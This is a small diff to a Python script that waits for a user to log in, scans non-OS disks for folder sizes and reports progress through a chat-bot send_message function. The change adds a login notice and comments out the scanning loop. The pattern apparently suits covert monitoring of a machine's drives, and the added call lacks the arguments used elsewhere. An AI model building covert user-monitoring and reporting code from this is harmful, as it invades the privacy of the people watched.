@@ -176,8 +176,9 @@ def sleep_until_user_loged():
 #Param 2 : for no OS disks
 
 sleep_until_user_loged()
+send_message("User loged.")
 
-for disks in scan_disks(1, 10):
+"""for disks in scan_disks(1, 10):
     for disks in disks:
         #Calcul disk size
         total_size = get_folder_size(str(disks))
@@ -199,4 +200,4 @@ for disks in scan_disks(1, 10):
         #Send
         send_message(chat_id, token, "Done in : " + str(elapsed_time) + " seconds")
         #Print infos
-        print(f"Done in {str(elapsed_time)} seconds")
+        print(f"Done in {str(elapsed_time)} seconds")"""
